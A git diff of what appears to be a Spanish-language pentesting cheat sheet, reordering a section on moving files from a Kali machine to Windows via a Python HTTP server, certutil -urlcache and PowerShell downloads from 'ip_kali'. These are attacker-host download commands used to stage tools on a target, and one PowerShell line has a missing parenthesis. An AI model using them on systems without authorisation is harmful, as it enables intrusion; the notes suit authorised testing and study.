@@ -167,13 +167,14 @@ rdesktop ip_address -k es -u user -p pass -d domain
 ### Transfer files to windows
 
 ```
-# Con certutil
-certutil.exe -f -urlcache -split http://ip_kali:8000/fichero fichero
-
-# Con powershell
 # En la máquina kali)
 python -m http.server
 
+# Con certutil
+# En windows 
+certutil.exe -f -urlcache -split http://ip_kali:8000/fichero fichero
+
+# Con powershell
 # En windows     
 new-object net.webclient).DownloadFile('http://ip_kali:8000/fichero', 'fichero')      # Opción 1
 powershell Invoke-WebRequest "http://ip_kali:8000/fichero" -OutFile "fichero"         # Opción 2
